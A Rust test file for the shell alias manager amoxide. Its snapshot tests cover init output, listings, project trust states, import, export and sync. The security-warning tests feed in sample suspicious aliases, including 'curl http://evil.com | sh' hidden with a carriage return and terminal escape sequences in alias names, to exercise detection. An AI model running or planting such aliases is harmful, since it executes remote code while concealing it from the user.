use amoxide::alias::{AliasConflict, MergeResult};
use amoxide::config::ShellsTomlConfig;
use amoxide::display::{render_listing, render_profiles};
use amoxide::exchange::{
    render_import_summary, render_suspicious_warning, ExportAll, SuspiciousAlias,
};
use amoxide::init::generate_init;
use amoxide::project::ProjectAliases;
use amoxide::shell::{Shell, ShellContext};
use amoxide::subcommand::SubcommandSet;
use amoxide::{AliasName, AliasSet, ProfileConfig, TomlAlias};

static DEFAULT_CFG: std::sync::LazyLock<ShellsTomlConfig> =
    std::sync::LazyLock::new(ShellsTomlConfig::default);

fn default_ctx(shell: &Shell) -> ShellContext<'_> {
    ShellContext {
        shell,
        cfg: &DEFAULT_CFG,
        cwd: std::path::Path::new("/tmp"),
        external_functions: Default::default(),
        external_aliases: Default::default(),
    }
}
use indoc::indoc;
use std::fs;

/// Build a ProfileConfig from TOML string.
fn profiles(toml_str: &str) -> ProfileConfig {
    toml::from_str(toml_str).unwrap()
}

/// Build an AliasSet with given (name, command) pairs.
fn aliases(pairs: &[(&str, &str)]) -> AliasSet {
    let mut set = AliasSet::default();
    for (name, cmd) in pairs {
        set.insert(AliasName::from(*name), TomlAlias::Command(cmd.to_string()));
    }
    set
}

// ─── Test bed: git + git-conventional as separate profiles ──────────────

fn git_conventional_config() -> ProfileConfig {
    profiles(indoc! {r#"
        [[profiles]]
        name = "default"

        [[profiles]]
        name = "git"
        [profiles.aliases]
        gs = "git status"
        cm = "git commit -sm"

        [[profiles]]
        name = "git-conventional"
        [profiles.aliases]
        cmf = "cm feat: {{@}}"
    "#})
}

// ─── Test bed: base, git, rust as separate profiles ─────────────────────

fn deep_chain_config() -> ProfileConfig {
    profiles(indoc! {r#"
        [[profiles]]
        name = "base"
        [profiles.aliases]
        ll = "ls -lha"

        [[profiles]]
        name = "git"
        [profiles.aliases]
        gs = "git status"

        [[profiles]]
        name = "rust"
        [profiles.aliases]
        ct = "cargo test"
    "#})
}

// ═══════════════════════════════════════════════════════════════════════
// Init snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_init_fish_simple_profile() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "default"
        [profiles.aliases]
        ll = "ls -lha"
        gs = "git status"
    "#});
    let resolved = config.resolve_active_aliases(&["default"]);
    let output = generate_init(
        &default_ctx(&Shell::Fish),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_zsh_simple_profile() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "default"
        [profiles.aliases]
        ll = "ls -lha"
        gs = "git status"
    "#});
    let resolved = config.resolve_active_aliases(&["default"]);
    let output = generate_init(
        &default_ctx(&Shell::Zsh),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_powershell_simple_profile() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "default"
        [profiles.aliases]
        ll = "ls -lha"
        gs = "git status"
    "#});
    let resolved = config.resolve_active_aliases(&["default"]);
    let output = generate_init(
        &default_ctx(&Shell::Powershell),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_bash_simple_profile() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "default"
        [profiles.aliases]
        ll = "ls -lha"
        gs = "git status"
    "#});
    let resolved = config.resolve_active_aliases(&["default"]);
    let output = generate_init(
        &default_ctx(&Shell::Bash),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_fish_multi_profile() {
    let config = git_conventional_config();
    let resolved = config.resolve_active_aliases(&["git", "git-conventional"]);
    let output = generate_init(
        &default_ctx(&Shell::Fish),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_fish_with_globals() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "rust"
        [profiles.aliases]
        ct = "cargo test"
    "#});
    let globals = aliases(&[("ll", "ls -lha")]);
    let resolved = config.resolve_active_aliases(&["rust"]);
    let output = generate_init(
        &default_ctx(&Shell::Fish),
        &globals,
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_fish_deep_chain() {
    let config = deep_chain_config();
    let resolved = config.resolve_active_aliases(&["base", "git", "rust"]);
    let output = generate_init(
        &default_ctx(&Shell::Fish),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_fish_with_simple_subcommands() {
    let globals = aliases(&[("gs", "git status")]);
    let mut subcommands = SubcommandSet::new();
    subcommands
        .as_mut()
        .insert("jj:ab".into(), vec!["abandon".into()]);
    subcommands
        .as_mut()
        .insert("jj:new".into(), vec!["new --no-edit".into()]);
    let output = generate_init(
        &default_ctx(&Shell::Fish),
        &globals,
        &AliasSet::default(),
        &subcommands,
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_bash_with_kubectl_subcommands() {
    let mut subcommands = SubcommandSet::new();
    subcommands
        .as_mut()
        .insert("kubectl:get:po".into(), vec!["get".into(), "pods".into()]);
    subcommands.as_mut().insert(
        "kubectl:get:svc".into(),
        vec!["get".into(), "services".into()],
    );
    subcommands
        .as_mut()
        .insert("kubectl:apply:f".into(), vec!["apply".into(), "-f".into()]);
    subcommands.as_mut().insert(
        "kubectl:rollout:status".into(),
        vec!["rollout".into(), "status".into()],
    );
    subcommands
        .as_mut()
        .insert("kubectl:logs:f".into(), vec!["logs".into(), "-f".into()]);
    let output = generate_init(
        &default_ctx(&Shell::Bash),
        &AliasSet::default(),
        &AliasSet::default(),
        &subcommands,
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_fish_globals_and_multi_profile() {
    // Full scenario: globals + multiple active profiles
    let globals = aliases(&[("ll", "ls -lha")]);
    let config = git_conventional_config();
    let resolved = config.resolve_active_aliases(&["git", "git-conventional"]);
    let output = generate_init(
        &default_ctx(&Shell::Fish),
        &globals,
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

// ═══════════════════════════════════════════════════════════════════════
// Display snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_display_profile_list() {
    let config = git_conventional_config();
    let output = render_profiles(&config, &["git-conventional".to_string()]);
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_display_multi_active() {
    let config = deep_chain_config();
    let output = render_profiles(&config, &["base".to_string(), "rust".to_string()]);
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_display_listing_with_globals_and_project() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "rust"
        [profiles.aliases]
        ct = "cargo test"
    "#});
    let globals = aliases(&[("ll", "ls -lha")]);

    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join(".aliases");
    fs::write(
        &path,
        indoc! {r#"
            [aliases]
            b = "make build"
        "#},
    )
    .unwrap();
    let project = ProjectAliases::load(&path).unwrap();

    let trust =
        amoxide::trust::ProjectTrust::Trusted(project, std::path::PathBuf::from(".aliases"));
    let output = render_listing(
        &globals,
        &SubcommandSet::new(),
        &config,
        &["rust".to_string()],
        Some(&trust),
        None,
    );
    insta::assert_snapshot!(output);
}

// ═══════════════════════════════════════════════════════════════════════
// Trust state listing snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_listing_unknown_project() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "rust"
        [profiles.aliases]
        ct = "cargo test"
    "#});

    let trust = amoxide::trust::ProjectTrust::Unknown(std::path::PathBuf::from(
        "/path/to/project/.aliases",
    ));

    let output = render_listing(
        &AliasSet::default(),
        &SubcommandSet::new(),
        &config,
        &["rust".to_string()],
        Some(&trust),
        None,
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_listing_tampered_project() {
    let trust = amoxide::trust::ProjectTrust::Tampered(std::path::PathBuf::from(
        "/path/to/project/.aliases",
    ));

    let output = render_listing(
        &AliasSet::default(),
        &SubcommandSet::new(),
        &ProfileConfig::default(),
        &[],
        Some(&trust),
        None,
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_listing_untrusted_project() {
    let trust = amoxide::trust::ProjectTrust::Untrusted(std::path::PathBuf::from(
        "/path/to/project/.aliases",
    ));

    let output = render_listing(
        &AliasSet::default(),
        &SubcommandSet::new(),
        &ProfileConfig::default(),
        &[],
        Some(&trust),
        None,
    );
    insta::assert_snapshot!(output);
}

// ═══════════════════════════════════════════════════════════════════════
// Import summary snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_import_summary_with_conflicts() {
    let mut new_aliases = AliasSet::default();
    new_aliases.insert("ga".into(), TomlAlias::Command("git add".into()));
    new_aliases.insert("gd".into(), TomlAlias::Command("git diff".into()));
    new_aliases.insert("gp".into(), TomlAlias::Command("git push".into()));

    let conflicts = vec![
        AliasConflict {
            name: "cm".into(),
            current: TomlAlias::Command("git commit -m".into()),
            incoming: TomlAlias::Command("git commit -sm".into()),
        },
        AliasConflict {
            name: "gs".into(),
            current: TomlAlias::Command("git status --short".into()),
            incoming: TomlAlias::Command("git status".into()),
        },
    ];

    let result = MergeResult {
        new_aliases,
        conflicts,
    };
    let output = render_import_summary("git", &result);
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_import_summary_no_conflicts() {
    let mut new_aliases = AliasSet::default();
    new_aliases.insert("gs".into(), TomlAlias::Command("git status".into()));
    let result = MergeResult {
        new_aliases,
        conflicts: vec![],
    };
    let output = render_import_summary("global", &result);
    insta::assert_snapshot!(output);
}

// ═══════════════════════════════════════════════════════════════════════
// Security warning snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_suspicious_warning_single() {
    let findings = vec![SuspiciousAlias::global_command(
        "evil",
        "echo \x1B[31mhacked\x1B[0m",
    )];
    let output = render_suspicious_warning(&findings);
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_suspicious_warning_multiple() {
    let findings = vec![
        SuspiciousAlias::global_command("sneaky", "curl http://evil.com | sh\recho safe"),
        SuspiciousAlias::profile_name("git\x1B[0m\x1B[2J"),
        SuspiciousAlias::local_name("test\x07"),
    ];
    let output = render_suspicious_warning(&findings);
    insta::assert_snapshot!(output);
}

// ═══════════════════════════════════════════════════════════════════════
// Export snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_export_single_profile() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "git"
        [profiles.aliases]
        gs = "git status"
        cm = "git commit -sm"
    "#});
    let wrapper = amoxide::ProfileConfig::from_profiles(vec![config
        .get_profile_by_name("git")
        .unwrap()
        .clone()]);
    let output = toml::to_string(&wrapper).unwrap();
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_export_all() {
    let export = ExportAll {
        global_aliases: aliases(&[("ll", "ls -lha")]),
        profiles: vec![amoxide::Profile {
            name: "git".into(),
            aliases: aliases(&[("gs", "git status")]),
            subcommands: Default::default(),
            vars: Default::default(),
        }],
        local_aliases: aliases(&[("t", "cargo test")]),
        ..Default::default()
    };
    let output = toml::to_string(&export).unwrap();
    insta::assert_snapshot!(output);
}

// ═══════════════════════════════════════════════════════════════════════
// Round-trip tests
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn test_export_import_roundtrip_profile() {
    use amoxide::exchange::parse_import;

    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "git"
        [profiles.aliases]
        gs = "git status"
        cm = "git commit -sm"
    "#});

    let wrapper = amoxide::ProfileConfig::from_profiles(vec![config
        .get_profile_by_name("git")
        .unwrap()
        .clone()]);
    let exported = toml::to_string(&wrapper).unwrap();
    let parsed = parse_import(&exported).unwrap();
    assert_eq!(parsed.profiles.len(), 1);
    assert_eq!(parsed.profiles[0].name, "git");
    assert_eq!(parsed.profiles[0].aliases.len(), 2);
}

#[test]
fn test_export_import_roundtrip_all() {
    use amoxide::exchange::{parse_import, ExportAll};

    let export = ExportAll {
        global_aliases: aliases(&[("ll", "ls -lha")]),
        profiles: vec![amoxide::Profile {
            name: "git".into(),
            aliases: aliases(&[("gs", "git status")]),
            subcommands: Default::default(),
            vars: Default::default(),
        }],
        local_aliases: aliases(&[("t", "cargo test")]),
        ..Default::default()
    };

    let exported = toml::to_string(&export).unwrap();
    let parsed = parse_import(&exported).unwrap();
    assert_eq!(parsed.global_aliases.len(), 1);
    assert_eq!(parsed.profiles.len(), 1);
    assert_eq!(parsed.local_aliases.len(), 1);
}

#[test]
fn test_base64_export_import_roundtrip() {
    use amoxide::exchange::{base64_decode, base64_encode, parse_import, ExportAll};

    let export = ExportAll {
        global_aliases: aliases(&[("ll", "ls -lha")]),
        ..Default::default()
    };

    let toml_str = toml::to_string(&export).unwrap();
    let encoded = base64_encode(&toml_str);
    let decoded = base64_decode(&encoded).unwrap();
    let parsed = parse_import(&decoded).unwrap();
    assert_eq!(parsed.global_aliases.len(), 1);
}

// ═══════════════════════════════════════════════════════════════════════
// Message::Import integration tests
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn test_import_payload_through_update() {
    use amoxide::config::Config;
    use amoxide::exchange::ImportPayload;
    use amoxide::update::{update, AppModel};

    let config = Config::default();
    let profile_config = profiles(indoc! {r#"
        [[profiles]]
        name = "git"
        [profiles.aliases]
        gs = "git status"
    "#});

    let mut model = AppModel::new(config, profile_config);

    let payload = ImportPayload {
        global_aliases: Some(aliases(&[("ll", "ls -lha")])),
        profiles: vec![amoxide::Profile {
            name: "git".into(),
            aliases: aliases(&[("gp", "git push")]),
            subcommands: Default::default(),
            vars: Default::default(),
        }],
        ..Default::default()
    };

    let result = update(&mut model, amoxide::Message::Import(payload)).unwrap();
    // Should have SaveConfig + SaveProfiles effects
    assert!(!result.effects.is_empty());

    assert_eq!(model.config.aliases.len(), 1);
    let git = model.profile_config().get_profile_by_name("git").unwrap();
    assert_eq!(git.aliases.len(), 2); // gs + gp
}

#[test]
fn test_import_payload_global_only_no_save_profiles() {
    use amoxide::config::Config;
    use amoxide::effects::Effect;
    use amoxide::exchange::ImportPayload;
    use amoxide::update::{update, AppModel};

    let config = Config::default();
    let profile_config = profiles(indoc! {r#"
        [[profiles]]
        name = "git"
    "#});

    let mut model = AppModel::new(config, profile_config);

    let payload = ImportPayload {
        global_aliases: Some(aliases(&[("ll", "ls -lha")])),
        ..Default::default()
    };

    let result = update(&mut model, amoxide::Message::Import(payload)).unwrap();
    // Only SaveConfig, no SaveProfiles (no profiles imported)
    assert_eq!(result.effects, vec![Effect::SaveConfig]);
    assert!(result.next.is_none());
    assert_eq!(model.config.aliases.len(), 1);
}

// ═══════════════════════════════════════════════════════════════════════
// Share command snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_share_termbin_profile() {
    use amoxide::cli::{ScopeArgs, ShareArgs};
    use amoxide::import_export::handle_share;

    let args = ShareArgs {
        scope: ScopeArgs {
            local: false,
            global: false,
            profile: vec!["git".into()],
            all: false,
        },
        termbin: true,
        paste_rs: false,
    };
    let output = handle_share(&args);
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_share_paste_rs_all() {
    use amoxide::cli::{ScopeArgs, ShareArgs};
    use amoxide::import_export::handle_share;

    let args = ShareArgs {
        scope: ScopeArgs {
            local: false,
            global: false,
            profile: vec![],
            all: true,
        },
        termbin: false,
        paste_rs: true,
    };
    let output = handle_share(&args);
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_share_help() {
    use amoxide::cli::{ScopeArgs, ShareArgs};
    use amoxide::import_export::handle_share;

    let args = ShareArgs {
        scope: ScopeArgs {
            local: false,
            global: false,
            profile: vec![],
            all: false,
        },
        termbin: false,
        paste_rs: false,
    };
    let output = handle_share(&args);
    insta::assert_snapshot!(output);
}

#[test]
fn sync_fresh_load_emits_aliases_and_env_var() {
    use amoxide::precedence::Precedence;
    let aliases = aliases(&[("gs", "git status")]);
    let diff = Precedence::new()
        .with_profiles(&aliases, &SubcommandSet::new())
        .resolve();
    let shell = Shell::Fish.as_shell(&Default::default(), Default::default(), Default::default());
    let out = diff.render(shell.as_ref());
    assert!(out.contains("function gs\n    git status $argv\nend"));
    assert!(out.contains("_AM_ALIASES"));
    assert!(out.contains("gs|"));
}

#[test]
fn sync_tampered_returns_save_security_effect_and_excludes_project() {
    use amoxide::app_model::AppModel;
    use amoxide::messages::Message;
    use amoxide::shell::Shell;
    use amoxide::update::update;

    let dir = tempfile::tempdir().unwrap();
    let aliases_path = dir.path().join(".aliases");
    fs::write(&aliases_path, "[aliases]\nt = \"cargo test\"\n").unwrap();

    let mut sec = amoxide::security::SecurityConfig::default();
    // Trust with a wrong hash to force tamper.
    sec.trust(&aliases_path, "wrong_hash");
    let mut model = AppModel::new_with_security(
        amoxide::Config::default(),
        amoxide::ProfileConfig::default(),
        sec,
    )
    .with_cwd(dir.path().to_path_buf());

    // Smoke test: we don't care about stdout, just the effect list.
    let res = update(&mut model, Message::Sync(Shell::Fish, true)).unwrap();
    assert!(
        res.effects
            .iter()
            .any(|e| matches!(e, amoxide::Effect::SaveSecurity)),
        "tampered file must trigger SaveSecurity effect"
    );
}

#[cfg(feature = "test-util")]
#[test]
fn init_force_unloads_introspected_names_with_hash_suffix_stripped() {
    use amoxide::app_model::AppModel;
    use amoxide::messages::Message;
    use amoxide::shell::Shell;
    use amoxide::update::update;

    // Simulate a prior session where _AM_ALIASES held name|hash entries.
    // The force init must emit `unalias name` (no `|hash` suffix).
    std::env::set_var("_AM_ALIASES", "b|abc1234,t|def5678");

    let dir = tempfile::tempdir().unwrap();
    let mut model = AppModel::load_from(dir.path().to_path_buf());

    // The real coverage is the snapshot added in Task 15. Here we just
    // assert the handler completes without panicking.
    let res = update(&mut model, Message::InitShell(Shell::Fish, true));
    assert!(res.is_ok());

    std::env::remove_var("_AM_ALIASES");
}

// ═══════════════════════════════════════════════════════════════════════
// Sync snapshots — cover behaviors that snapshot_hook_* and
// snapshot_reload_* used to exercise, now through the Precedence Engine.
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_sync_fish_fresh_load_project_only() {
    use amoxide::precedence::Precedence;
    let project = aliases(&[("b", "cargo build"), ("t", "cargo test")]);
    let shell = Shell::Fish.as_shell(&Default::default(), Default::default(), Default::default());
    let diff = Precedence::new()
        .with_project(&project, &SubcommandSet::new())
        .resolve();
    let output = diff.render(shell.as_ref());
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_sync_bash_fresh_load_project_only() {
    use amoxide::precedence::Precedence;
    let project = aliases(&[("b", "cargo build")]);
    let shell = Shell::Bash.as_shell(&Default::default(), Default::default(), Default::default());
    let diff = Precedence::new()
        .with_project(&project, &SubcommandSet::new())
        .resolve();
    let output = diff.render(shell.as_ref());
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_sync_zsh_fresh_load_project_only() {
    use amoxide::precedence::Precedence;
    let project = aliases(&[("b", "cargo build")]);
    let shell = Shell::Zsh.as_shell(&Default::default(), Default::default(), Default::default());
    let diff = Precedence::new()
        .with_project(&project, &SubcommandSet::new())
        .resolve();
    let output = diff.render(shell.as_ref());
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_sync_powershell_fresh_load_project_only() {
    use amoxide::precedence::Precedence;
    let project = aliases(&[("b", "cargo build")]);
    let shell =
        Shell::Powershell.as_shell(&Default::default(), Default::default(), Default::default());
    let diff = Precedence::new()
        .with_project(&project, &SubcommandSet::new())
        .resolve();
    let output = diff.render(shell.as_ref());
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_sync_fish_transition_to_new_project() {
    use amoxide::precedence::Precedence;
    let project = aliases(&[("new1", "echo new")]);
    let prev_hash = amoxide::trust::compute_short_hash(b"echo old");
    let prev = format!("old1|{prev_hash}");
    let shell = Shell::Fish.as_shell(&Default::default(), Default::default(), Default::default());
    let diff = Precedence::new()
        .with_project(&project, &SubcommandSet::new())
        .with_shell_state_from_env(Some(&prev), None)
        .resolve();
    let output = diff.render(shell.as_ref());
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_sync_fish_leaving_project_with_shadow_restoration() {
    use amoxide::precedence::Precedence;
    // Previously the project shadowed a profile alias `t`. Now we've left the
    // project directory — effective `t` reverts to the profile value. The
    // stored hash was the project's; new effective hash is the profile's.
    // The engine must re-emit the profile `t` (shadow restoration).
    let profile = aliases(&[("t", "cargo test"), ("ll", "ls -lha")]);
    let project_hash = amoxide::trust::compute_short_hash(b"cargo test --release");
    let ll_hash = amoxide::trust::compute_short_hash(b"ls -lha");
    let prev = format!("t|{project_hash},b|aaa1111,ll|{ll_hash}");
    let shell = Shell::Fish.as_shell(&Default::default(), Default::default(), Default::default());
    let diff = Precedence::new()
        .with_profiles(&profile, &SubcommandSet::new())
        .with_shell_state_from_env(Some(&prev), None)
        .resolve();
    let output = diff.render(shell.as_ref());
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_sync_fish_incremental_one_alias_updated() {
    use amoxide::precedence::Precedence;
    let project = aliases(&[("b", "cargo build --release"), ("t", "cargo test")]);
    let old_b_hash = amoxide::trust::compute_short_hash(b"cargo build");
    let t_hash = amoxide::trust::compute_short_hash(b"cargo test");
    let prev = format!("b|{old_b_hash},t|{t_hash}");
    let shell = Shell::Fish.as_shell(&Default::default(), Default::default(), Default::default());
    let diff = Precedence::new()
        .with_project(&project, &SubcommandSet::new())
        .with_shell_state_from_env(Some(&prev), None)
        .resolve();
    let output = diff.render(shell.as_ref());
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_sync_bash_subcommand_wrapper_fresh_load() {
    use amoxide::precedence::Precedence;
    let mut subs = SubcommandSet::new();
    subs.as_mut().insert("jj:ab".into(), vec!["abandon".into()]);
    let shell = Shell::Bash.as_shell(&Default::default(), Default::default(), Default::default());
    let diff = Precedence::new()
        .with_project(&AliasSet::default(), &subs)
        .resolve();
    let output = diff.render(shell.as_ref());
    insta::assert_snapshot!(output);
}
